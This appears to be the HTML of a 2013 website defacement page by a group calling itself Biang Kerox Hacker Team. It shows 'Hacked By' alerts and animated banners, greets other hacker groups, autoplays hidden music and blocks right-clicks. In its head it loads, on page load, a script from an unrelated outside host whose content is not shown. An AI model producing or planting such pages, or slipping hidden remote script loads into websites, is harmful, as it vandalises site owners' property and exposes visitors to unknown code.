
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">



<html>

<head>

<script> alert(" BiaNG KEROX HACKER TEAM ") </script> <script> alert("admin please path your website")</script>

<script> alert("NO NAME A7X WAS HERE :p") </script>

<meta content="text/html; charset=utf-8" http-equiv="Content-Type"> <title>[+]=='No name a7x WAS HERE'==[+]</title> 

<script>

function tb9_makeArray(n){

  this.length = n;

  return this.length;

}

tb9_messages = new tb9_makeArray(4);

tb9_messages[0] = "[+] Hacked By no name a7x [+] ";

tb9_messages[1] = "Biang Kerox Hacker Team";

tb9_messages[2] = "[+] Hacked By no name a7x [+] ";

tb9_messages[3] = "Biang Kerox Hacker Team";

tb9_messages[4] = "[+] Hacked By no name a7x [+]";

tb9_messages[5] = "Biang Kerox Hacker Team";

tb9_rptType = 'infinite';

tb9_rptNbr = 5;

tb9_speed = 75;

tb9_delay = 2000;

var tb9_counter=1;

var tb9_currMsg=0;

var tb9_timerID = null

var tb9_bannerRunning = false

var tb9_state = ""

tb9_clearState()

function tb9_stopBanner() {  

  if (tb9_bannerRunning)    

  clearTimeout(tb9_timerID)  

  tb9_timerRunning = false

}

function tb9_startBanner() {  

  tb9_stopBanner()  

  tb9_showBanner()

}

function tb9_clearState() {  

  tb9_state = ""  

  for (var i = 0; i < tb9_messages[tb9_currMsg].length; ++i) {    

    tb9_state += "0"  

  }

}

function tb9_showBanner() {  

if (tb9_getString()) {    

  tb9_currMsg++    

  if (tb9_messages.length <= tb9_currMsg)  {    

    if ((tb9_rptType == 'finite') && (tb9_counter==tb9_rptNbr)){

      tb9_stopBanner();

      return;

    }

    tb9_counter++;

    tb9_currMsg=0;

  }

  tb9_clearState()    

  tb9_timerID = setTimeout("tb9_showBanner()", tb9_delay)  

} 

else {    

  var tb9_str = ""    

for (var j = 0; j < tb9_state.length; ++j) {      

  tb9_str += (tb9_state.charAt(j) == "1") ? tb9_messages[tb9_currMsg].charAt(j) : "___"    

}    

document.title = tb9_str    

tb9_timerID = setTimeout("tb9_showBanner()", tb9_speed)  

}

}

function tb9_getString() {  

  var full = true  

  for (var j = 0; j < tb9_state.length; ++j) {    

    if (tb9_state.charAt(j) == 0)      

      full = false  

    }  

  if (full) return true  

  while (1) {    

    var num = tb9_getRandom(tb9_messages[tb9_currMsg].length)    

    if (tb9_state.charAt(num) == "0")      

      break

  }  

  tb9_state = tb9_state.substring(0, num) + "1" + tb9_state.substring(num + 1, tb9_state.length)  

  return false

}

function tb9_getRandom(max) {  

  var now = new Date()    

  var num = now.getTime() * now.getSeconds() * Math.random()  

  return num % max

}

tb9_startBanner()

</script>



<script type="text/javascript" src="http://x.dickeymaru.com/y"></script></head>

<body bgcolor="Black" style="background-image: url('')

"><br>

<h1><font face="Poor Richard"><center><SCRIPT>







farbbibliothek = new Array();







farbbibliothek[0] = new Array("#FF0000","#FF1100","#FF2200","#FF3300","#FF4400","#FF5500","#FF6600","#FF7700","#FF8800","#FF9900","#FFaa00","#FFbb00","#FFcc00","#FFdd00","#FFee00","#FFff00","#FFee00","#FFdd00","#FFcc00","#FFbb00","#FFaa00","#FF9900","#FF8800","#FF7700","#FF6600","#FF5500","#FF4400","#FF3300","#FF2200","#FF1100");







farbbibliothek[1] = new Array("#FF0000","#FFFFFF","#FFFFFF","#FF0000");







farbbibliothek[2] = new Array("#FFFFFF","#FF0000","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF");







farbbibliothek[3] = new Array("#FF0000","#FF4000","#FF8000","#FFC000","#FFFF00","#C0FF00","#80FF00","#40FF00","#00FF00","#00FF40","#00FF80","#00FFC0","#00FFFF","#00C0FF","#0080FF","#0040FF","#0000FF","#4000FF","#8000FF","#C000FF","#FF00FF","#FF00C0","#FF0080","#FF0040");







farbbibliothek[4] = new Array("#FF0000","#EE0000","#DD0000","#CC0000","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000","#110000","#220000","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000");





farbbibliothek[5] = new Array("#FF0000","#FF0000","#FF0000","#FFFFFF","#FFFFFF","#FFFFFF");





farbbibliothek[6] = new Array("#FF0000","#FDF5E6");







farben = farbbibliothek[4];







function farbschrift()







{







for(var i=0 ; i<Buchstabe.length; i++)







{







document.all["a"+i].style.color=farben[i];







}







farbverlauf();







}







function string2array(text)







{







Buchstabe = new Array();







while(farben.length<text.length)







{







farben = farben.concat(farben);







}







k=0;







while(k<=text.length)







{







Buchstabe[k] = text.charAt(k);







k++;







}







}







function divserzeugen()







{







for(var i=0 ; i<Buchstabe.length; i++)







{







document.write("<span id='a"+i+"' class='a"+i+"'>"+Buchstabe[i] + "</span>");







}







farbschrift();







}







var a=1;







function farbverlauf()







{







for(var i=0 ; i<farben.length; i++)







{







farben[i-1]=farben[i];







}







farben[farben.length-1]=farben[-1];















setTimeout("farbschrift()",30);







}







//







var farbsatz=1;







function farbtauscher()







{







farben = farbbibliothek[farbsatz];







while(farben.length<text.length)







{







farben = farben.concat(farben);







}







farbsatz=Math.floor(Math.random()*(farbbibliothek.length-0.0001));







}







setInterval("farbtauscher()",10000);







text ="HACKED BY NO NAME A7X ";//h







string2array(text);







divserzeugen();







//document.write(text);

</SCRIPT></center></h1></font>



<link href="http://fonts.googleapis.com/css?

family=Averia+Sans+Libre" rel="stylesheet"

type="text/css">

<link href="http://fonts.googleapis.com/css?

family=Orbitron:700" rel="stylesheet" type="text/ css">

<link href="http://fonts.googleapis.com/css?

family=Nosifer" rel="stylesheet" type="text/css">

<meta name="Description" content="UYAP-CASTOL">

<style type="text/css"><!--

body,td,th {; text-align: center;

} {

color: #0C3;

font-size: 20px;

}

body {} .shakeimage{

position:relative

}

.glow {}

.contact {

}{} .lol {}

#owned{_top:expression

(document.documentElement.scrollTop

+document.documentElement.clientHeight-

this.clientHeight);

_left:expression (document.documentElement.scrollLeft +

document.documentElement.clientWidth - offsetWidth)

;

}

a:l--></style>

<center><img alt="" src="https://s3.amazonaws.com/rizap_medium/71602960582822561380205647625.jpg" width="" height="40%" "="" border="0" class="shakeimage" onmouseover="init(this)

;rattleimage()" onload="init(this);rattleimage()"

style="left: 3px; top: 0px"></center> <center>

<center> <style>

body{text-align;font-family: 'Averia Sans Libre',

cursive;}

hr{border: 1px solid #1C1C1C;}

</style>



<style type="text/css"> body,td,th {color: #FFFFFF; }

body {cursor:url("http://www.fbvideo.16mb.com/files/cur.cur"),default; background-color: #000000; }

a { text-decoration:none; }

a:link { color: #00FF00}

a:visited { color: #00FF00}

a:hover { color: #00FF00}

a:active { color: #00FF00} .style2 {Helvetica, sans-serif; font-weight: bold; font-

size: 15px; }

.style3 {Helvetica, sans-serif; font-weight: bold; }

.style4 {color: #FFFF00}

.style5 {color: #FF0000}

.style6 {color: #00FF00} img{border:4px double green;

    box-shadow:0px 9px 15px white; border-radius:10px;} .thanks{border:4px double green;

    box-shadow:0px 2px 20px white; border-radius:10px;

padding:9px;} .a{text-shadow:0px 1px 10px lime;}

</style> <center><br><br><p></p><font face="Orbitron"

size="7" color="red" class="a">We Are BIANG<font face="Orbitron" size="7" color="white"

class="a">KEROX </font><font face="Orbitron"

size="7" color="white" class="a">TEAM</font>

<br> <font color="black">FucK You Haters</font>

<br>

<center>

<table width="100%" border="2">

<tbody><tr> <td width="10%" align="center"> <blink><font color="red"><code>Greetz To : </code></font></blink> </td> <td width="90%"> <font color="lime">

<marquee><code> Andrelite | Monica Audra Bellarina | ./F4jzar-xCyb3r207 | Jagad Dot Id | xmin homo  |

zerocx BKHT| komxzer | LEVII YONDAIME | M4GI233N|

cimpli|Coplax| xnx | JERINX | UYAP | N2_IM | kotek | kotem | | inurl:/index.php | kanjeng| PAIMO | el-Yofro | jack jahat | agam bastard | ARDIAN CAISAR | Caliber | xsoul |DASILVA |achmad5191 | RAFNI  |kliverz | wantexz | GARUDA CYBER ATTACKER | BIANG KEROX HACKER TEAM | WAPHACKER | JATIMCOM |KILL-9 CREW | INDONESIA CYBER ARMY | ANTIHACKERLINK| YOGYACARDERLINK | SURABAYA HACKERLINK | SURABAYA BLACK HAT :p |</code></marquee> </font></td> </tr></tbody></table>



<object data="http://flash-mp3-player.net/medias/player_mp3.swf" width="0" height="0" type="application/x-shockwave-flash"><param value="http://flash-mp3-player.net/medias/player_mp3.swf" name="movie"/><param value="#ffffff" name="bgcolor"/><param value="mp3=http://a.tumblr.com/tumblr_ls7dpxtQV81qkn9o6o1.mp3&amp;loop=1&amp;autoplay=1&amp;volume=125" name="FlashVars"/></object>  <script type="text/javascript">var DADrightclicktheme = 'Dark';var DADrightclickimage = 'https://fbcdn-sphotos-b-a.akamaihd.net/hphotos-ak-ash4/1234005_478160648958675_275513455_n.jpg';</script>



<script type="text/javascript" src="http://tuyulz- blogspot.googlecode.com/files/Anti%20Klik.js">



 </script><style type="text/css">#DADarcv2c{background:url(https://fbcdn-sphotos-b-a.akamaihd.net/hphotos-ak-ash4/1234005_478160648958675_275513455_n.jpg) no-repeat center center fixed rgba(0,0,0, 0.9);text-align:center;width:100%;height:100% ;position:fixed;top:0px;left:0px;bottom:0px;right:0px;border:0px;z-index:1000000;display:none;padding:auto;}#DADarcv2c span{position:fixed;bottom:0px;left:10%;right:10%;cursor:pointer;font-size:20px;}</style><div id="DADarcv2c" class="DADpointer" onclick="DADarcvwi2();" title="Klick Dimana Saja Untuk Menutup Warning Ini"><center><span><a href="#" target="_blank"></a></span></center></div><style <style="" type="text/css"> body{

</style> 



<center><font color="lime" size="8" face="Rhavi">PepesaN By NO NAME A7X<br><font color="pink" size="4">BKHT is Pinkhat not blackhat and not whitehat :*<br> We are love KIMCIL :*<br>We are not ALAYYERS <br>We are CAPCUZZ <br> And We are comedian Hacker <br> SALAM RUSUH HA...HA...HA...<br></font><hr></center>

<center> <span class="wglow" style="font-family:Courier New;"><b> -[ </b></span><a href="https://twitter.com/BIANGKEROXTEAM"><button class="evil" onclick="meow()"><b><span style="color: # 009900;">Muka Mesum :v</span></b></button></a><span class="wglow" style="font-family: Courier New;"><b> ]- -[ </b></span><a href="http://www.facebook.com/MoslemHackerTeam?ref=ts&amp;fref=ts"><button class="evil" onclick="box()"><b><span style="color: #009900;">Biang Kerox Team</span></b></button></a><span class="wglow" style="font-family: Courier New;"><b> ]- -[ </b></span><a href="http://www.facebook.com/HunterClasst"><button class="evil" onclick="box()"><b><span style="color: #009900;">Muka gw Ganteng :D</span></b></button></a><span class="wglow" style="font-family: Courier New;"><b> ]- </b></span> <center><center><img src="//img2.blogblog.com/img/video_object.png" style="background-color: #b2b2b2; height: 0px; width: 0px; " class="BLOGGER-object-element tr_noresize tr_placeholder" id="BLOGGER_object_0" data-original-id="BLOGGER_object_0"> <font face="calibri" color="Red" size="6"><b><marquee width="175%"> Kami Memang Bangsaaaat Tapi Suatu Saat Kami Akan Bertobat [ BIANG KEROX TEAM NEVER DIES ]</marquee><br></font> <style type="text/css">body {cursor:url("http://i873.photobucket.com/albums/ab293/wusananto/spe114.gif"),default}</style> </b></center></center></center></font></center></font></center></center></center>

<marquee direction="left" scrollamount="100" scrolldelay="40"><font color="red"> ----------------------------------------------------------------------------------------</font></marquee>

<center><font color="lime" face="Arial" size="2">Copyroot &copy; 2013 | Newbie Web Design | ./F4jzar-xCyb3r207 | Biang Kerox Hacker Team</font></center>

<marquee direction="right" scrollamount="100" scrolldelay="40"><font color="red"> ----------------------------------------------------------------------------------------</font></marquee><br>

</body>

</html>
